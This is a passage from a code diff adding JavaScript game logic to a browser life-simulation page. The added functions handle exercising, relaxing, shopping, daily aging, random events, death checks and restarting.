+        player.happiness += 3;
+
+        log(
+            "You exercised and improved your health."
+        );
+
+        clampStats();
+
+        updateUI();
+
+    }
+
+
+    function relax() {
+
+        player.happiness += 8;
+
+        player.energy += 10;
+
+        log(
+            "You relaxed and recovered some energy."
+        );
+
+        clampStats();
+
+        updateUI();
+
+    }
+
+
+    function shop() {
+
+        const cost = 100;
+
+        if (player.money < cost) {
+
+            setEvent(
+                "Not Enough Money",
+                "You don't have enough money to go shopping."
+            );
+
+            return;
+        }
+
+        player.money -= cost;
+
+        player.happiness += 12;
+
+        log(
+            "You spent $100 shopping and had a great time."
+        );
+
+        clampStats();
+
+        updateUI();
+
+    }
+
+
+    function nextDay() {
+
+        if (!player.alive) return;
+
+        player.age++;
+
+        player.energy = 80;
+
+        if (player.job !== "Unemployed") {
+
+            player.money += player.income;
+
+        }
+
+        // Natural aging
+        if (player.age > 50) {
+            player.health -= 1;
+        }
+
+        if (player.age > 65) {
+            player.health -= 2;
+        }
+
+        // Random event
+        if (Math.random() < 0.45) {
+
+            const event =
+                randomEvents[
+                    Math.floor(
+                        Math.random() *
+                        randomEvents.length
+                    )
+                ];
+
+            event.action();
+
+            setEvent(
+                event.title,
+                event.text,
+                [
+                    {
+                        text: "Continue",
+                        primary: true,
+                        action: () => {}
+                    }
+                ]
+            );
+
+        } else {
+
+            setEvent(
+                `Day ${player.age - 17}`,
+                "Another day begins. What will you do?",
+                [
+                    {
+                        text: "Continue",
+                        primary: true,
+                        action: () => {}
+                    }
+                ]
+            );
+
+        }
+
+        clampStats();
+
+        updateUI();
+
+        checkDeath();
+
+    }
+
+
+    function checkDeath() {
+
+        if (player.health <= 0 || player.age >= 100) {
+
+            player.alive = false;
+
+            document.getElementById("finalAge")
+                .textContent = player.age;
+
+            document.getElementById("finalMoney")
+                .textContent =
+                player.money.toLocaleString();
+
+            document.getElementById("finalHealth")
+                .textContent =
+                Math.round(player.health);
+
+            document.getElementById("finalHappiness")
+                .textContent =
+                Math.round(player.happiness);
+
+            document.getElementById("finalReputation")
+                .textContent =
+                Math.round(player.reputation);
+
+            document.getElementById("gameOver")
+                .style.display = "flex";
+
+        }
+
+    }
+
+
+    function restartGame() {
+
+        player = {
+
+            name: randomName(),
+
+            age: 18,
+
+            money: 1000,
+
+            health: 75,
+
+            happiness: 75,
+
+            intelligence: 50,
+
+            energy: 80,
+
+            reputation: 20,
+
+            job: "Unemployed",
+
+            income: 0,
+
+            alive: true
+
+        };
+
+        document.getElementById("gameOver")
+            .style.display = "none";
+
+        document.getElementById("logList")
+            .innerHTML =
+            `<div class="log-entry">
+                You started a new life with $1,000.
+            </div>`;
+
+        setEvent(
+            "Welcome to Life",
+            "You are 18 years old with your entire life ahead of you. What will you do?",
+            [
+                {
+                    text: "Start Your Life",
+                    primary: true,
+                    action: nextDay
+                }
+            ]
+        );
+
+        updateUI();
+
+    }
+
+
+    updateUI();
+
 </script>
 
 </body>
